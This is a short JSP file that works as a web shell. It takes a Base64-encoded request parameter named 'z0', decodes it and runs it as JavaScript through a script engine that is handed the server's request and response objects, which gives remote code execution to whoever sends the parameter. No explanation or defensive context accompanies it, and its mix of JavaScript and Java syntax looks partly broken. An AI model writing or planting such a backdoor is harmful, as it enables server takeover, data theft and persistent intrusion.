<%

function main() {
    var paramMap = request.getParameterMap();
    var code = "";

    code = new java.lang.String(java.util.Base64.getDecoder().decode(paramMap.get("z0")[0]), "UTF-8");

    if (code == "")
        return;

    ScriptEngineManager mgr = new ScriptEngineManager();
    ScriptEngine eng = mgr.getEngineByName("js");
    
    eng.put("response", response); 
    eng.put("request", request);
    
    try {
        eng.eval(code);
    } catch (Exception e) {
        response.getWriter().println("Engine Error: " + e.getMessage());
    }
}

main()

%>